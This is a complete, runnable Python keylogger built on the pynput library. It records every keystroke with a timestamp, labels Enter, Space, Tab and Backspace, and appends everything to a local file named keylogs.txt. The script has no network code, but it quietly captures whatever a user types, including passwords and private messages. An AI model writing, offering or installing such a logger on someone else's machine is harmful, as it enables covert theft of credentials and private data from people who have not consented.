from pynput import keyboard
import time
import os

def log_keys(key):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    key_info = f"{current_time} - {key}\n"

    if key == keyboard.Key.enter:
        key_info = f"{current_time} - [ENTER]\n"
    elif key == keyboard.Key.space:
        key_info = f"{current_time} - [SPACE]\n"
    elif key == keyboard.Key.tab:
        key_info = f"{current_time} - [TAB]\n"
    elif key == keyboard.Key.backspace:
        key_info = f"{current_time} - [BACKSPACE]\n"

    with open("keylogs.txt", "a") as log_file:
        log_file.write(key_info)

def on_key_press(key):
    try:
        log_keys(key)
    except Exception as e:
        print(f"Error: {e}")

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
